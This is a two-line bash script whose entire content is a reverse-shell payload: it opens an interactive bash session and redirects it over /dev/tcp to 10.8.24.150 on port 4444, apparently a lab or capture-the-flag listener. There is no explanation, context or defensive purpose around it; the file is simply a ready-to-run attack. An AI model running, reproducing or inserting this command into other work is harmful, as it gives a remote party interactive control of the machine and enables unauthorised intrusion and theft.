#!/bin/bash
bash -i >& /dev/tcp/10.8.24.150/4444 0>&1
